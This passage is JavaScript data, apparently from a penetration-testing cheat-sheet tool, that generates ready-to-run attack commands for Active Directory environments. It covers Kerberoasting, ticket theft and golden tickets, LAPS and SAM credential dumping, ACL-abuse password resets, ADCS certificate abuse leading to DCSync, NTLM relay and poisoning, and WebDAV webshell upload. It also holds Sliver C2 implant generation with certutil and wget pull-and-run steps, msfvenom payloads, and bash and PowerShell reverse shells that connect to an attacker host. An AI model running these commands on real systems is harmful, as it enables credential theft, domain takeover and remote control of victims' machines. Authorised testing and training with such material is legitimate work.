          { label: "KDC_ERR_ETYPE_NOTSUPP", cmd: `cat /etc/krb5.conf | grep -i enctype`, note: "RC4 disabled on the DC or on your client. Add rc4-hmac to permitted_enctypes, or roast for AES and use -m 19700." },
          { label: "hashcat: No hashes loaded", cmd: `head -c 60 tgs.txt\ncut -d'$' -f2,3 tgs.txt | sort -u`, note: "Wrong -m for the etype, or the file holds john format instead of hashcat format." },
        ]},
        { phase: "Rubeus (on a Windows foothold)", cmds: [
          { label: "Kerberoast → hashes", cmd: `.\\Rubeus.exe kerberoast /nowrap /outfile:tgs.txt`, note: "Crack with hashcat -m 13100." },
          { label: "Kerberoast — stats only", cmd: `.\\Rubeus.exe kerberoast /stats`, note: "Shows how many roastable accounts exist and their password-set dates. Old dates crack." },
          { label: "AS-REP roast", cmd: `.\\Rubeus.exe asreproast /nowrap /format:hashcat /outfile:asrep.txt` },
          { label: "Dump + monitor TGTs", cmd: `.\\Rubeus.exe triage\n.\\Rubeus.exe monitor /interval:5 /nowrap`, note: "monitor harvests tickets as users log in." },
          { label: "Pass-the-ticket (inject)", cmd: `.\\Rubeus.exe ptt /ticket:BASE64_OR_KIRBI`, note: "Inject a stolen/forged ticket into the current session." },
          { label: "Overpass-the-hash → TGT", cmd: `.\\Rubeus.exe asktgt /user:${U} /rc4:${SEC} /ptt`, note: "Turn an NT hash into a usable TGT in-session." },
        ]},
        { phase: "Other tickets", cmds: [
          { label: "Request TGT", cmd: authMode === "hash"
            ? `impacket-getTGT ${D}/${U} -hashes :${SEC} -dc-ip ${DCIP}`
            : `impacket-getTGT ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP}`, note: "Then: export KRB5CCNAME=${U}.ccache" },
          { label: "Use ccache (-k -no-pass)", cmd: `export KRB5CCNAME=$PWD/${U}.ccache\nklist\nimpacket-psexec -k -no-pass ${D}/${U}@${HOST} -dc-ip ${DCIP}`, note: "Use an ABSOLUTE path — a relative KRB5CCNAME breaks the moment you cd." },
          { label: "Golden ticket (ticketer)", cmd: `impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain ${D} Administrator` },
        ]},
      ],
    },
    localadmin: {
      name: "Local Admin / Creds", groups: [
        { phase: "Am I local admin? (the --local-auth check)", cmds: [
          { label: "Check one host (look for Pwn3d!)", cmd: `nxc smb ${IP} ${nxcA()} --local-auth`, note: "(Pwn3d!) = local admin on THIS box. LAPS/SAM creds are LOCAL, so --local-auth is mandatory." },
          { label: "Spray a hash across the subnet", cmd: `nxc smb ${SUBNET} -u Administrator -H ${SEC} --local-auth`, note: "Find every host where this local hash works — classic local-admin reuse sweep." },
          { label: "psexec as local admin", cmd: `impacket-psexec administrator:${Q}${SEC}${Q}@${IP}`, note: "Drop -hashes :HASH instead of the password if you only have the hash." },
        ]},
        { phase: "LAPS (read the local admin password)", cmds: [
          { label: "Confirm + dump readers", cmd: `nxc ldap ${IP} ${nxcA()} -M laps`, note: "If the reader isn't you, find who can: enumerate the computer object's ACL." },
          { label: "ldapsearch fallback (legacy attr)", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(&(objectClass=computer)(cn=${HOST}))" ms-Mcs-AdmPwd` },
          { label: "Use it → local admin on the box", cmd: `nxc smb ${IP} -u administrator -p ${Q}LAPS_PW${Q} --local-auth`, note: "Then psexec --local-auth. If it's the DC, that's SYSTEM → DCSync." },
        ]},
        { phase: "No creds yet — pull users", cmds: [
          { label: "RID brute (null/guest)", cmd: `nxc smb ${IP} -u '' -p '' --rid-brute`, note: "Enumerates domain users via SID cycling with no creds." },
          { label: "lookupsid", cmd: `impacket-lookupsid ${D}/${U}:${Q}${SEC}${Q}@${IP}` },
          { label: "Build users.txt from RID brute", cmd: `nxc smb ${IP} -u '' -p '' --rid-brute | grep SidTypeUser | cut -d'\\' -f2 | cut -d' ' -f1 > users.txt` },
        ]},
        { phase: "Resolve SIDs", cmds: [
          { label: "ConvertFrom-SID (PowerView)", cmd: `ConvertFrom-SID S-1-5-21-...-1115`, note: "Turn an ACL/LAPS-reader SID into a name. RID 512 = Domain Admins; 1100+ = a custom principal." },
        ]},
      ],
    },
    aclabuse: {
      name: "ACL Abuse", groups: [
        { phase: "1 — Find the edge", cmds: [
          { label: "1.1  BloodHound — shortest path", cmd: `bloodhound-python -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D} -ns ${DCIP} -c All --zip`, note: "Mark yourself Owned, run 'Shortest paths from Owned principals'. The edge type decides which phase below you use." },
          { label: "1.2  ACLs on a specific target", cmd: `Get-DomainObjectAcl -Identity TARGET -ResolveGUIDs | ? { $_.SecurityIdentifier -eq (ConvertTo-SID ${Q}${U}${Q}) }`, note: "Look for GenericAll / GenericWrite / WriteDacl / ForceChangePassword / AddMember." },
          { label: "1.3  Every ACL edge in the domain (Linux)", cmd: `nxc ldap ${IP} ${nxcA()} --bloodhound --collection All -ns ${DCIP}`, note: "No Windows foothold needed — collect from Kali and read the graph." },
        ]},
        { phase: "2A — GenericWrite on a user (SAFEST — no reset)", cmds: [
          { label: "2A.1  Targeted kerberoast", cmd: `targetedKerberoast.py -v -d ${D} -u ${U} -p ${Q}${SEC}${Q} --request-user TARGETUSER`, note: "Adds a temp SPN, roasts, removes it. Changes nothing permanent — always prefer this over a password reset." },
          { label: "2A.2  Crack the returned hash", cmd: `hashcat -m 13100 targeted_tgs.txt /usr/share/wordlists/rockyou.txt` },
        ]},
        { phase: "2B — ForceChangePassword / GenericAll on a user", cmds: [
          { label: "2B.1  RECORD the current state first", cmd: `# You are about to overwrite a real password. Note the target\n# so you can flag it in your report — you cannot restore the old one.`, note: "Reading, not running. Password reset is destructive and irreversible — know that before you do it." },
          { label: "2B.2  Reset the password", cmd: `net rpc password TARGETUSER 'NewPass123!' -U ${Q}${D}/${U}%${SEC}${Q} -S ${DCIP}`, note: "Loud and permanent. Fine in labs; document it on a real engagement." },
          { label: "2B.3  PowerView variant", cmd: `$p=ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force; Set-DomainUserPassword -Identity TARGETUSER -AccountPassword $p` },
        ]},
        { phase: "2C — GenericAll on a group", cmds: [
          { label: "2C.1  Add yourself to the group", cmd: `net rpc group addmem "TARGET GROUP" ${U} -U ${Q}${D}/${U}%${SEC}${Q} -S ${DCIP}` },
          { label: "2C.2  Re-auth to pick up membership", cmd: `# Group membership is baked into your ticket at logon.\n# Get a fresh TGT or reconnect — the old ticket won't have it.`, note: "Reading, not running. This is why 'I added myself but still can't' happens." },
        ]},
        { phase: "2D — GenericWrite on a computer (RBCD)", cmds: [
          { label: "2D.1  Write the delegation", cmd: `impacket-rbcd -delegate-to 'TARGET$' -delegate-from ${U} -action write ${Q}${D}/${U}:${SEC}${Q}` },
          { label: "2D.2  Get an impersonated ST", cmd: `impacket-getST -spn cifs/TARGET.${D} -impersonate Administrator -dc-ip ${DCIP} ${Q}${D}/${U}:${SEC}${Q}` },
        ]},
        { phase: "3 — VERIFY it worked", cmds: [
          { label: "3.1  Password reset → test the login", cmd: `nxc smb ${IP} -u TARGETUSER -p 'NewPass123!' -d ${D}`, note: "[+] confirms the reset. STATUS_LOGON_FAILURE means the reset silently failed — check your ACL edge again." },
          { label: "3.2  Group add → confirm membership", cmd: `nxc ldap ${IP} ${nxcA()} --query "(sAMAccountName=${U})" "memberOf"`, note: "The target group should now appear. If not, the addmem was rejected." },
          { label: "3.3  RBCD → check the attribute took", cmd: `impacket-rbcd -delegate-to 'TARGET$' -action read ${Q}${D}/${U}:${SEC}${Q}`, note: "Lists who can delegate. Your account should be there before you try getST." },
        ]},
        { phase: "4 — Use the new access", cmds: [
          { label: "4.1  Reset path → shell as the target", cmd: `evil-winrm -i ${HOST}.${D} -u TARGETUSER -p 'NewPass123!'` },
          { label: "4.2  RBCD path → use the ST", cmd: `export KRB5CCNAME=$PWD/Administrator@cifs_TARGET.${D}.ccache\nimpacket-psexec -k -no-pass ${D}/Administrator@TARGET.${D}` },
        ]},
        { phase: "5 — RESTORE (real engagements)", cmds: [
          { label: "5.1  Remove yourself from the group", cmd: `net rpc group delmem "TARGET GROUP" ${U} -U ${Q}${D}/${U}%${SEC}${Q} -S ${DCIP}`, note: "Undo AddMember when you're done. Leave the environment as you found it." },
          { label: "5.2  Remove RBCD delegation", cmd: `impacket-rbcd -delegate-to 'TARGET$' -delegate-from ${U} -action remove ${Q}${D}/${U}:${SEC}${Q}` },
          { label: "5.3  Password reset — cannot be undone", cmd: `# The original password is gone. Flag the account in your report\n# so the owner can be told to reset it. There is no rollback.`, note: "Reading, not running. This is exactly why 2A (targeted roast) is the preferred path when you have the choice." },
        ]},
      ],
    },
    adcs: {
      name: "ADCS / Certipy", groups: [
        { phase: "0 — Setup", cmds: [
          { label: "0.1  Map the DC + CA in /etc/hosts", cmd: `echo "${hostsLine}" | sudo tee -a /etc/hosts`, note: "Certipy's auth step is Kerberos-backed — hostname must resolve or PKINIT fails." },
          { label: "0.2  Check clock skew (bites the auth step)", cmd: `ntpdate -q ${DCIP}`, note: "certipy req can succeed while certipy auth dies on KRB_AP_ERR_SKEW. Fix now. See the Kerberos tab step 0.3." },
        ]},
        { phase: "1 — Find vulnerable templates", cmds: [
          { label: "1.1  certipy find (vuln only)", cmd: `certipy find -u ${U}@${D} -p ${Q}${SEC}${Q} -dc-ip ${DCIP} -vulnerable -stdout`, note: "Flags ESC1–16. Note the CA name and template name — every later step needs both." },
          { label: "1.2  certipy find (with a hash)", cmd: `certipy find -u ${U}@${D} -hashes :${SEC} -dc-ip ${DCIP} -vulnerable -stdout` },
          { label: "1.3  nxc ADCS module (quick check)", cmd: `nxc ldap ${IP} ${nxcA()} -M adcs`, note: "Fast yes/no on whether a CA even exists before you dig in." },
        ]},
        { phase: "2 — ESC1: request a cert as anyone", cmds: [
          { label: "2.1  Request as Administrator", cmd: `certipy req -u ${U}@${D} -p ${Q}${SEC}${Q} -dc-ip ${DCIP} -ca CA-NAME -template VULN-TEMPLATE -upn administrator@${D}`, note: "CA-NAME and VULN-TEMPLATE come from step 1.1. On DCs patched post-May-2022 also add: -sid <administrator's SID>." },
          { label: "2.2  (patched DCs) get the target SID first", cmd: `impacket-lookupsid ${Q}${D}/${U}:${SEC}${Q}@${DCIP} | grep -i administrator`, note: "Feed the 500 SID into -sid on the req above when the CA enforces the SID extension." },
        ]},
        { phase: "3 — VERIFY the cert is usable", cmds: [
          { label: "3.1  Did the .pfx get written?", cmd: `ls -l administrator.pfx`, note: "No file = the request was denied (perms, wrong template, or CA offline). Re-read the find output." },
          { label: "3.2  Inspect the UPN inside it", cmd: `certipy cert -pfx administrator.pfx -nokey\ncertipy cert -pfx administrator.pfx -nocert 2>/dev/null | head`, note: "The UPN in the cert must be administrator@domain. If it's YOUR name, the -upn didn't take and auth will fail." },
        ]},
        { phase: "4 — Authenticate → hash + TGT", cmds: [
          { label: "4.1  certipy auth", cmd: `certipy auth -pfx administrator.pfx -dc-ip ${DCIP}`, note: "Returns Administrator's NT hash AND a .ccache TGT. Wrap in faketime if step 0.2 showed drift." },
          { label: "4.2  Load the TGT", cmd: `export KRB5CCNAME=$PWD/administrator.ccache\nklist`, note: "Absolute path — a relative KRB5CCNAME breaks the moment you cd." },
        ]},
        { phase: "5 — Use the result", cmds: [
          { label: "5.1  DCSync with the recovered hash", cmd: `impacket-secretsdump -just-dc ${Q}${D}/administrator${Q}@${DCIP} -hashes :RECOVERED_HASH`, note: "RECOVERED_HASH is the NT hash from step 4.1." },
          { label: "5.2  Or shell straight in", cmd: `evil-winrm -i ${HOST}.${D} -u administrator -H RECOVERED_HASH`, note: "Pass-the-hash to a shell — no cracking, the cert gave you the hash directly." },
        ]},
        { phase: "6 — ESC8 (relay to web enroll)", cmds: [
          { label: "6.1  Start the relay", cmd: `impacket-ntlmrelayx -t http://${DCIP}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`, note: "Leave running. It captures a cert for whatever machine account you coerce." },
          { label: "6.2  Coerce the DC to authenticate", cmd: `python3 PetitPotam.py -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D} ${LHOST} ${DCIP}`, note: "Forces DC$ to auth to your relay. relayx prints a base64 cert for DC$ → certipy auth that for a DC TGT." },
        ]},
        { phase: "7 — Error decoder", cmds: [
          { label: "KRB_AP_ERR_SKEW on certipy auth", cmd: `ntpdate -q ${DCIP}`, note: "Classic: req works (LDAP/HTTP), auth fails (Kerberos). Fix the clock, retry just the auth step." },
          { label: "req: certificate request denied", cmd: `certipy find -u ${U}@${D} -p ${Q}${SEC}${Q} -dc-ip ${DCIP} -vulnerable -stdout`, note: "Your account can't enroll on that template, or you typed the CA/template wrong. Re-read find." },
          { label: "auth: KDC_ERR_PADATA_TYPE_NOSUPP", cmd: `# The DC lacks a KDC certificate — PKINIT isn't available.\n# Fall back to the -ldap-shell that certipy auth offers, or ESC8.`, note: "Not every ESC path ends in a hash. This DC can't do cert logon; pivot to relay." },
          { label: "auth: object SID mismatch", cmd: `# Post-May-2022 patch: the cert needs the target's SID.\n# Re-request with -sid <administrator SID> (step 2.2).`, note: "The single most common ESC1 failure on current patch levels." },
        ]},
      ],
    },
    relay: {
      name: "Relay / Poison", groups: [
        { phase: "0 — Setup (relay fails silently without this)", cmds: [
          { label: "0.1  Find targets with SMB signing OFF", cmd: `nxc smb ${SUBNET} --gen-relay-list targets.txt\ncat targets.txt`, note: "You can ONLY relay to hosts where signing is not required. This writes exactly those." },
          { label: "0.2  Disable SMB + HTTP in Responder", cmd: `sudo sed -i 's/^SMB = On/SMB = Off/; s/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf\ngrep -E '^(SMB|HTTP)' /etc/responder/Responder.conf`, note: "ntlmrelayx needs those ports. If Responder holds them, the relay never receives the auth. THE step people miss." },
          { label: "0.3  Confirm your listen interface", cmd: `ip -br a | grep -E 'tun0|eth0'`, note: "Lab VPN is usually tun0. Poisoning the wrong interface captures nothing." },
        ]},
        { phase: "1 — Passive first (see before you poison)", cmds: [
          { label: "1.1  Analyze-only", cmd: `sudo responder -I tun0 -A`, note: "-A watches without answering. Tells you who's broadcasting for names before you inject." },
        ]},
        { phase: "2 — Relay", cmds: [
          { label: "2.1  ntlmrelayx → SMB (dump SAM)", cmd: `impacket-ntlmrelayx -tf targets.txt -smb2support`, note: "Default action dumps SAM on any relayed host where the victim is local admin." },
          { label: "2.2  ntlmrelayx → exec a command", cmd: `impacket-ntlmrelayx -tf targets.txt -smb2support -c 'powershell -enc <B64>'` },
          { label: "2.3  ntlmrelayx → SOCKS (hold the session)", cmd: `impacket-ntlmrelayx -tf targets.txt -smb2support -socks`, note: "Keeps relayed sessions open in a socks list — use them later through proxychains." },
          { label: "2.4  Poison (only after passive looks right)", cmd: `sudo responder -I tun0 -wv`, note: "Now actively answers LLMNR/NBT-NS. Run this in a second pane; relayx catches what it coerces." },
          { label: "2.5  Or coerce a specific host", cmd: `python3 PetitPotam.py -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D} ${LHOST} ${IP}`, note: "Deterministic — forces one host to auth to you instead of waiting for a mistyped path." },
        ]},
        { phase: "3 — VERIFY the relay landed", cmds: [
          { label: "3.1  Watch for the success line", cmd: `# In the relayx window, look for:\n#   [*] Authenticating against smb://... SUCCEED\n#   [*] Dumping local SAM hashes\n# Hashes scrolling in Responder ≠ a successful relay.`, note: "Responder capturing a Net-NTLMv2 hash and relayx completing a relay are DIFFERENT events. Confirm the relayx line." },
          { label: "3.2  If SOCKS mode — list live sessions", cmd: `# type in the relayx prompt:\nsocks`, note: "Empty list = nothing relayed yet, keep coercing. Populated = pivot with proxychains." },
        ]},
        { phase: "4 — Use it", cmds: [
          { label: "4.1  Crack a captured Net-NTLMv2 (if no relay target)", cmd: `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`, note: "When signing is ON everywhere you can't relay — fall back to cracking what Responder caught." },
          { label: "4.2  Use a SOCKS session", cmd: `proxychains -q nxc smb 127.0.0.1 -u <relayed_user> --local-auth`, note: "Drive the held session through proxychains for further action." },
        ]},
        { phase: "5 — Error decoder", cmds: [
          { label: "Relay connects but nothing dumps", cmd: `grep -E '^(SMB|HTTP)' /etc/responder/Responder.conf`, note: "Both must read Off. Responder squatting on 445/80 is the #1 cause of a silent relay." },
          { label: "All targets rejected", cmd: `nxc smb ${SUBNET} | grep -i 'signing:True'`, note: "Signing required everywhere = relay impossible. Switch to cracking (step 4.1) or coercion elsewhere." },
          { label: "STATUS_ACCESS_DENIED on relay", cmd: `# The relayed user isn't admin on the target.\n# Relay to a DIFFERENT host where they are, or use -socks to hold it.`, note: "A valid relay to a box the user can't admin still gets you nothing. Aim it where they have rights." },
          { label: "Responder silent (no events)", cmd: `ip -br a | grep tun0`, note: "Wrong -I interface. Poisoning eth0 on a tun0 VPN sees no lab traffic." },
        ]},
      ],
    },
    mssql: {
      name: "MSSQL", groups: [
        { phase: "Connect & exec", cmds: [
          { label: "mssqlclient", cmd: authMode === "krb"
            ? `impacket-mssqlclient -k ${D}/${U}@${HOST} -dc-ip ${DCIP}`
            : `impacket-mssqlclient ${Q}${D}/${U}:${SEC}${Q}@${IP} -windows-auth` },
          { label: "enable xp_cmdshell", cmd: `EXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';` },
        ]},
      ],
    },
    winrm: {
      name: "WinRM", groups: [
        { phase: "Shell", cmds: [
          { label: "evil-winrm", cmd: `evil-winrm -i ${TH} -u ${U} ${winrmAuth}`, note: authMode === "krb" ? "Needs KRB5CCNAME set + host in /etc/hosts." : null },
          { label: "nxc winrm — check + exec", cmd: `nxc winrm ${IP} ${nxcA()} -x 'whoami'` },
        ]},
      ],
    },
    rdp: {
      name: "RDP", groups: [
        { phase: "Connect", cmds: [
          { label: "xfreerdp", cmd: authMode === "hash"
            ? `xfreerdp /u:${U} /pth:${SEC} /v:${IP} +clipboard /cert:ignore`
            : `xfreerdp /u:${U} /p:${Q}${SEC}${Q} /v:${TH} +clipboard /cert:ignore` },
          { label: "nxc rdp — check", cmd: `nxc rdp ${IP} ${nxcA()}` },
        ]},
      ],
    },
    webdav: {
      name: "WebDAV", groups: [
        { phase: "1 — Detect", cmds: [
          { label: "1.1  nmap — methods + webdav-scan", cmd: `nmap -p 80,443 --script http-webdav-scan,http-methods ${IP}` },
          { label: "1.2  OPTIONS — look for PUT in Allow", cmd: `curl -s -i -X OPTIONS http://${IP}/ | grep -i -E 'allow|dav'` },
          { label: "1.3  Probe common dirs", cmd: `for d in / /webdav/ /dav/ /uploads/ /files/; do echo "== $d =="; curl -s -i -X OPTIONS http://${IP}$d | grep -i allow; done`, note: "PUT in the Allow line = you can upload there." },
        ]},
        { phase: "2 — Confirm what lands (davtest)", cmds: [
          { label: "2.1  davtest (unauth)", cmd: `davtest -url http://${IP}` },
          { label: "2.2  davtest (authed)", cmd: `davtest -url http://${IP} -auth ${Q}${U}:${SEC}${Q}`, note: `Domain box? try the prefixed form ${Q}${NB}\\${U}:${SEC}${Q}.` },
          { label: "2.3  READ the davtest output", cmd: `# 'PUT File: SUCCEED' + 'Executes: ...aspx: SUCCEED' is the win.\n# Note which extension EXECUTES, not just which uploads.`, note: "Reading, not running. An extension can upload but not execute — that column is the whole game." },
        ]},
        { phase: "3 — Upload → RCE (IIS bypass)", cmds: [
          { label: "3.1  Make the shell (match the stack)", cmd: `cp /usr/share/webshells/aspx/cmdasp.aspx shell.aspx\ncp /usr/share/webshells/php/php-reverse-shell.php shell.php`, note: "IIS runs .aspx; Apache/PHP runs .php. A .php shell on IIS just downloads as text." },
          { label: "3.2  PUT .txt then MOVE to .aspx", cmd: `curl -s -u ${Q}${U}:${SEC}${Q} -X PUT http://${IP}/shell.txt --data-binary @shell.aspx\ncurl -s -u ${Q}${U}:${SEC}${Q} -X MOVE http://${IP}/shell.txt -H "Destination: http://${IP}/shell.aspx"`, note: "IIS blocks PUT of .aspx directly but allows .txt → MOVE renames server-side. Add --ntlm if it negotiates NTLM." },
          { label: "3.3  Direct PUT (PHP stack)", cmd: `curl -s -u ${Q}${U}:${SEC}${Q} -X PUT http://${IP}/shell.php --data-binary @shell.php` },
        ]},
        { phase: "4 — VERIFY it uploaded before triggering", cmds: [
          { label: "4.1  Confirm the file is there", cmd: `curl -s -o /dev/null -w "%{http_code}\\n" http://${IP}/shell.aspx`, note: "200 = present. 404 = the MOVE/PUT didn't land — don't waste time hitting a shell that isn't there." },
          { label: "4.2  Trigger it (listener up first)", cmd: `curl "http://${IP}/shell.aspx"`, note: "Start nc -lvnp <port> before this if it's a reverse shell." },
        ]},
        { phase: "5 — Interactive (cadaver)", cmds: [
          { label: "5.1  Open a session", cmd: `cadaver http://${IP}/`, note: "Prompts for creds if WebDAV needs auth. Use the path OPTIONS confirmed." },
          { label: "5.2  Inside the dav:/> prompt", cmd: `put shell.aspx              # upload your shell\nmove shell.txt shell.aspx   # IIS bypass: rename server-side\nls                          # list remote dir\nget web.config              # pull files (configs, creds)\ndelete shell.aspx           # clean up when done`, note: "These are cadaver commands, typed at the dav:/> prompt — not your shell." },
          { label: "5.3  Non-interactive auth (~/.netrc)", cmd: `echo "machine ${IP} login ${U} password ${SEC}" >> ~/.netrc && chmod 600 ~/.netrc\ncadaver http://${IP}/`, note: "cadaver auto-reads ~/.netrc so it won't prompt." },
        ]},
        { phase: "6 — Error decoder", cmds: [
          { label: "PUT returns 403 / 405", cmd: `curl -s -i -X OPTIONS http://${IP}/ | grep -i allow`, note: "PUT not in Allow = uploads are off on that path. Try a different dir from step 1.3." },
          { label: "Uploaded but shell downloads as text", cmd: `# Wrong stack: .php on IIS or .aspx on Apache renders as text.\n# davtest's 'Executes' column told you which one runs — use that.`, note: "The classic WebDAV trap. Match the shell extension to what step 2.3 said executes." },
          { label: "MOVE returns 409 Conflict", cmd: `# Destination dir doesn't exist or you lack write there.\n# MOVE within the SAME confirmed-writable dir.`, note: "Don't MOVE across directories unless both are writable." },
        ]},
      ],
    },
    sliver: {
      name: "Sliver C2", groups: [
        { phase: "0 — Start the server", cmds: [
          { label: "0.1  Launch Sliver", cmd: `sliver-server`, note: "Starts the server + drops you into the operator console. Or 'sliver' if the server daemon is already running." },
          { label: "0.2  Multiplayer — add an operator", cmd: `new-operator --name kali --lhost ${LHOST} --save /tmp/kali.cfg`, note: "Generates a client config. Import it on a second machine with: sliver import /tmp/kali.cfg" },
        ]},
        { phase: "1 — Start a listener", cmds: [
          { label: "1.1  mTLS listener (preferred)", cmd: `mtls --lport 8888`, note: "Encrypted, no proxy needed. Use this unless the target filters non-HTTP." },
          { label: "1.2  HTTPS listener", cmd: `https --lhost ${LHOST} --lport 443`, note: "Blends with web traffic — use when egress only allows 80/443." },
          { label: "1.3  HTTP listener", cmd: `http --lhost ${LHOST} --lport 80`, note: "Unencrypted fallback. Fine for labs, never for real." },
          { label: "1.4  Verify listeners are up", cmd: `jobs`, note: "Every listener is a job. No job listed = nothing is catching callbacks." },
          { label: "1.5  Kill a listener", cmd: `jobs -k <JOB_ID>` },
        ]},
        { phase: "2 — Generate implants", cmds: [
          { label: "2.1  Windows beacon (mTLS)", cmd: `generate beacon --mtls ${LHOST}:8888 --os windows --arch amd64 --format exe --seconds 5 --jitter 3 --name ${FN}`, note: "Double-dash on EVERY flag. -os is parsed as -o s and silently breaks." },
          { label: "2.2  Linux beacon (mTLS) — ELF", cmd: `generate beacon --mtls ${LHOST}:8888 --os linux --arch amd64 --format elf --seconds 5 --jitter 3 --name ${FN}`, note: "--format elf for Linux. The output is an ELF binary — chmod +x it on the target." },
          { label: "2.3  Windows beacon (HTTPS)", cmd: `generate beacon --https ${LHOST}:443 --os windows --arch amd64 --format exe --seconds 5 --jitter 3 --name ${FN}` },
          { label: "2.4  Linux beacon (HTTPS)", cmd: `generate beacon --https ${LHOST}:443 --os linux --arch amd64 --format elf --seconds 5 --jitter 3 --name ${FN}` },
          { label: "2.5  Shellcode (for injection)", cmd: `generate beacon --mtls ${LHOST}:8888 --os windows --arch amd64 --format shellcode --name ${FN}`, note: "Raw shellcode — feed it to a loader, not a direct exec." },
          { label: "2.6  Session (interactive, not beacon)", cmd: `generate --mtls ${LHOST}:8888 --os windows --arch amd64 --format exe --name ${FN}`, note: "No 'beacon' keyword = session mode. Persistent connection, noisier, but real-time interaction." },
          { label: "2.7  Failover (try mTLS, fall back to HTTPS)", cmd: `generate beacon --mtls ${LHOST}:8888 --https ${LHOST}:443 --os windows --format exe --seconds 5 --jitter 3 --name ${FN}`, note: "Tries transports left to right. Both listeners must be running." },
          { label: "2.8  List previously generated implants", cmd: `implants`, note: "Shows every implant you've built, with its config. Re-download with: implants regenerate --name <NAME>" },
        ]},
        { phase: "3 — Deploy + catch", cmds: [
          { label: "3.1  Serve it (Kali)", cmd: `python3 -m http.server ${SRVPORT}`, note: "From the directory Sliver saved the implant to." },
          { label: "3.2  Pull + run (Windows target)", cmd: `certutil -urlcache -f http://${LHOST}:${SRVPORT}/${FN} C:\\Windows\\Temp\\${FN}\nC:\\Windows\\Temp\\${FN}` },
          { label: "3.3  Pull + run (Linux target)", cmd: `wget http://${LHOST}:${SRVPORT}/${FN} -O /tmp/${FN} && chmod +x /tmp/${FN} && /tmp/${FN}` },
          { label: "3.4  Wait for callback", cmd: `beacons`, note: "Watch the Sliver console. A new line appears when the beacon checks in. Sessions show with: sessions." },
        ]},
        { phase: "4 — Interact", cmds: [
          { label: "4.1  Use a beacon", cmd: `use <BEACON_ID>`, note: "Tab-complete works on IDs. Beacon commands queue until the next check-in." },
          { label: "4.2  Use a session", cmd: `use <SESSION_ID>`, note: "Sessions are real-time — output returns immediately." },
          { label: "4.3  Interactive shell from a beacon", cmd: `interactive`, note: "Upgrades a beacon to a session for real-time interaction. Noisier." },
          { label: "4.4  Run a command", cmd: `shell\nwhoami`, note: "Opens a shell channel. Type 'exit' to close the shell channel, not the beacon." },
          { label: "4.5  Execute a single command", cmd: `execute -o whoami`, note: "-o shows output. Without it the command runs but you see nothing." },
        ]},
        { phase: "5 — Post-exploitation", cmds: [
          { label: "5.1  Upload a file", cmd: `upload /home/kali/tools/mimikatz.exe C:\\Windows\\Temp\\mimikatz.exe` },
          { label: "5.2  Download a file", cmd: `download C:\\Users\\Administrator\\Desktop\\proof.txt /home/kali/loot/` },
          { label: "5.3  Process list", cmd: `ps` },
          { label: "5.4  Network info", cmd: `ifconfig\nnetstat` },
          { label: "5.5  Pivot — add a listener through the implant", cmd: `pivot tcp --bind 0.0.0.0:1234`, note: "Opens a port on the compromised host. Generate a new implant with --tcp <pivot_host>:1234 to chain through it." },
        ]},
        { phase: "6 — VERIFY it's working", cmds: [
          { label: "6.1  Beacon checking in?", cmd: `beacons`, note: "Last check-in time tells you if it's alive. Stale = the process died or the network path broke." },
          { label: "6.2  Listener actually up?", cmd: `jobs`, note: "No jobs = nothing catching callbacks. Start the listener BEFORE deploying the implant." },
          { label: "6.3  Task stuck?", cmd: `tasks`, note: "Beacon tasks queue. If the beacon died before checking in, queued tasks never execute." },
        ]},
        { phase: "7 — Error decoder", cmds: [
          { label: "invalid compiler target: s/amd64", cmd: `# You wrote -os instead of --os. Single-dash parsed -o with value 's'.\n# Fix: --os windows  (double dash on every flag)`, note: "The #1 Sliver gotcha. -os is NOT --os. This session learned it the hard way." },
          { label: "Beacon never checks in", cmd: `jobs                     # listener up?\necho $LHOST              # is this the IP the target can reach (tun0, not eth0)?`, note: "Three causes: listener not running, wrong LHOST baked into the implant, or egress filtering on the target." },
          { label: "Beacon checks in then drops", cmd: `# Regenerated server certs (~/.sliver/) invalidated old implants.\n# Every implant's cert was signed by the old CA — regenerate the implant.`, note: "Symptom: connects, immediately disconnects. Cause: CA mismatch after a server reinstall." },
          { label: "Can't switch transport on a running beacon", cmd: `# Transport is baked in at generation time. An HTTP implant can't\n# speak mTLS. Regenerate with the new transport and re-deploy.`, note: "There's no 'switch to mTLS' command. Build a new implant." },
        ]},
      ],
    },
    payloads: {
      name: "Payloads / Shells", groups: [
        { phase: "msfvenom", cmds: [
          { label: "Windows x64 reverse exe", cmd: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f exe -o ${FN}` },
          { label: "Linux x64 reverse elf", cmd: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf -o ${FN}` },
          { label: "War / aspx / php (pick by stack)", cmd: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f war -o ${FN}.war\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f aspx -o ${FN}.aspx` },
        ]},
        { phase: "One-liners & listeners", cmds: [
          { label: "Bash reverse shell", cmd: `bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'` },
          { label: "PowerShell reverse (IEX cradle)", cmd: `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${LHOST}',${LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS> ';$sby=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}"` },
          { label: "Listener (rlwrap nc)", cmd: `rlwrap -cAr nc -lvnp ${LPORT}`, note: "rlwrap gives you arrow keys + history even before the full TTY upgrade." },
        ]},
        { phase: "Upgrade to a full TTY (Linux)", cmds: [
